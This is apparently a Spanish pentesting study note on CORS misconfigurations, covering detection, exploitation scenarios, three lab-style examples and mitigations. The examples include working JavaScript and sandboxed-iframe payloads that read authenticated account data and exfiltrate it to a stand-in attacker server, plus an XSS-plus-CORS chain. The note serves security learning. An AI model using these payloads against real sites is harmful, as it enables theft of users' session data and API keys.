
---
Tags: #web #cors #cabeceras #headers #robo

---
# 🗂️ Índice de Contenidos

- [[#📖 Definición|1. Definición y Conceptos Clave]]
    
- [[#🔎 Métodos de Detección|2. Metodología de Detección]]
    
- [[#💥 Métodos de Explotación|3. Vectores de Ataque]]
    
- [[#🛠 Ejemplos prácticos|4. Laboratorios y Payloads]]
    - [[#1. CORS con Reflexión Básica del Origen|4.1. Reflexión de Origen]]
    - [[#2. CORS con Origen null Confiable|4.2. Origen Null (Iframe Sandbox)]]
    - [[#3. CORS con Protocolos e Integridad de Subdominios Inseguros|4.3. Protocolos e Integridad (XSS + CORS)]]
        
- [[#Resumen de mitigación (Best Practices)|5. Guía de Mitigación]]
    
- [[#🎯 Resumen|6. Resumen]]

---
## 📖 Definición

**CORS** es un mecanismo de seguridad implementado en navegadores que controla si un dominio (origen) puede realizar solicitudes HTTP a otro dominio distinto.  
Un **origen** está compuesto por:

`<protocolo>://<dominio>:<puerto>`

👉 Vulnerabilidades de CORS aparecen cuando el servidor está mal configurado y **permite que orígenes no confiables realicen peticiones autenticadas** (enviando cookies, tokens, etc.).

Ejemplo inseguro en cabeceras de respuesta:

`Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true`

➡ Esto permite que **cualquier página maliciosa** haga peticiones al servidor como si fuera el usuario legítimo.

---

## 🔎 Métodos de Detección

|Método|Descripción|Herramienta|
|---|---|---|
|**Revisar cabeceras HTTP**|Buscar `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`.|Burp Suite, curl|
|**Probar orígenes arbitrarios**|Enviar solicitudes con `Origin: https://evil.com` y observar si se refleja.|Burp Suite Repeater|
|**Analizar respuestas**|Ver si `Access-Control-Allow-Origin` refleja dinámicamente el `Origin` enviado.|Proxy HTTP|
|**Pruebas con credenciales**|Ver si `Access-Control-Allow-Credentials: true` está habilitado.|Navegador, fetch()|

---

## 💥 Métodos de Explotación

| Escenario                     | Configuración insegura                                                      | Impacto                                                     |
| ----------------------------- | --------------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Wildcard con credenciales** | `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` | Cualquier dominio puede robar datos del usuario autenticado |
| **Reflejo de origen**         | Servidor devuelve el mismo `Origin` enviado por el atacante                 | Bypass de restricción de orígenes                           |
| **Subdominios inseguros**     | `Access-Control-Allow-Origin: *.victima.com`                                | Un atacante con control de subdominio puede explotar CORS   |
| **Cabeceras expuestas**       | `Access-Control-Expose-Headers` incluye cabeceras sensibles                 | Robo de tokens o datos confidenciales                       |

---

## 🛠 Ejemplos prácticos

## 1. CORS con Reflexión Básica del Origen

Esta es la configuración errónea más común. Ocurre cuando el servidor está configurado para leer el encabezado `Origin` de la petición del cliente y devolverlo dinámicamente en el encabezado `Access-Control-Allow-Origin`.

### La Vulnerabilidad

El servidor confía en **cualquier** origen que le enviemos. El punto crítico es la combinación de dos factores:

1. **Reflexión del Origen:** El servidor responde con `Access-Control-Allow-Origin: <tu-dominio>`.
    
2. **Credenciales Permitidas:** El servidor responde con `Access-Control-Allow-Credentials: true`. Esto permite que el navegador incluya cookies de sesión y otros datos de autenticación en la petición cross-origin.
    

**Respuesta Vulnerable:**

```HTTP
HTTP/2 200 OK
Access-Control-Allow-Origin: https://dominio-atacante.com
Access-Control-Allow-Credentials: true
...
{ "username": "wiener", "apikey": "GMvP5..." }
```

### Método de Explotación

El atacante aloja un script en su propio servidor. Cuando la víctima visita el sitio del atacante, el script hace una petición a la aplicación vulnerable usando las cookies de la víctima.

**Payload del Exploit:**

```JavaScript
var req1 = new XMLHttpRequest();
// 1. Apuntamos al endpoint que contiene datos sensibles
req1.open("GET","https://vulnerable.net/accountDetails", false);
// 2. Obligatorio para enviar las cookies de la víctima
req1.withCredentials = true; 
req1.send();

// 3. Codificamos la respuesta para evitar problemas con caracteres especiales
var response = btoa(req1.responseText);

// 4. Exfiltramos los datos a nuestro servidor (OAST / Collaborator)
var req2 = new XMLHttpRequest();
req2.open("GET","https://tu-servidor-oast.com?data=" + response);
req2.send();
```

---

## 2. CORS con Origen `null` Confiable

Algunos desarrolladores configuran el origen `null` en la "lista blanca" para dar soporte a aplicaciones locales o redirecciones extrañas.

### La Vulnerabilidad

El encabezado `Origin: null` se genera en situaciones específicas, como:

- Redirecciones entre protocolos.
    
- Archivos locales (`file://`).
    
- **Contenido dentro de un iframe con el atributo `sandbox`.**
    

Si el servidor responde con `Access-Control-Allow-Origin: null` y `Allow-Credentials: true`, podemos forzar al navegador a enviar un origen nulo.

### Método de Explotación

Usamos un **iframe sandboxed** para que la petición salga con el origen `null`.

**Payload del Exploit:**

```HTML
<iframe sandbox="allow-scripts" srcdoc='
<script>
    var req1 = new XMLHttpRequest();
    req1.open("GET","https://vulnerable.net/accountDetails", false);
    req1.withCredentials = true;
    req1.send();
    
    var response = btoa(req1.responseText);
    
    // Enviamos el botín a nuestro servidor
    var req2 = new XMLHttpRequest();
    req2.open("GET","https://tu-servidor-oast.com?response=" + response);
    req2.send();
</script>'></iframe>
```

---

## 3. CORS con Protocolos e Integridad de Subdominios Inseguros

A veces, la aplicación no refleja cualquier origen, pero tiene una **expresión regular (Regex)** mal configurada que confía en cualquier subdominio o permite el protocolo inseguro `http://`.

### La Vulnerabilidad

Si el servidor confía en `*.dominio-vulnerable.net`, un atacante puede explotar un **XSS en un subdominio** para realizar el ataque CORS, saltándose las restricciones de origen, ya que el dominio principal confía en el subdominio atacado.

### Método de Explotación (XSS + CORS)

En este caso, el exploit tiene dos pasos:

1. **Carga del script:** Se genera un payload que roba los datos.
    
2. **Inyección vía XSS:** Se redirige a la víctima al subdominio vulnerable donde el payload se ejecuta en un contexto "confiable" para la política CORS del servidor principal.
    
**Payload del Exploit:**

```JavaScript
<script>
    // 1. Definimos el script que robará los datos (CORS Bypass)
    var payload = '<script>' +
        'var req1 = new XMLHttpRequest();' +
        'req1.open("GET", "https://vulnerable.net/accountDetails", false);' +
        'req1.withCredentials = true;' +
        'req1.send();' +
        'var response = btoa(req1.responseText);' +
        'var req2 = new XMLHttpRequest();' +
        'req2.open("GET", "https://tu-servidor-oast.com?data=" + response);' +
        'req2.send();' +
    '<\/script>';

    // 2. Redirigimos a la víctima al subdominio con XSS inyectando el payload
    var urlFinal = "http://subdominio.vulnerable.net/?productId=" + encodeURIComponent(payload) + "&storeId=1";
    document.location = urlFinal;
</script>
```

---

### Resumen de mitigación (Best Practices)

|**Error común**|**Solución Correcta**|
|---|---|
|Reflejar el encabezado `Origin`|Usar una lista blanca estática de dominios permitidos.|
|Permitir `Origin: null`|Nunca confiar en el origen `null`.|
|Confiar en subdominios inseguros|Validar estrictamente el origen completo y usar siempre HTTPS.|
|`Allow-Credentials: true` con `*`|El estándar no permite esto, pero nunca se debe habilitar credenciales si no es estrictamente necesario.|

---

## 🎯 Resumen

- **Qué es:** CORS controla qué orígenes externos pueden interactuar con el servidor.
    
- **Vulnerabilidad:** ocurre cuando configuraciones laxas permiten a atacantes abusar de autenticación del usuario.
    
- **Cómo detectarlo:** probando cabeceras `Origin` personalizadas.
    
- **Cómo explotarlo:** usando JavaScript malicioso para leer datos de APIs autenticadas.
    
- **Impacto:** robo de datos sensibles, secuestro de cuentas.
    
- **Mitigación:** validación estricta de orígenes y cabeceras seguras.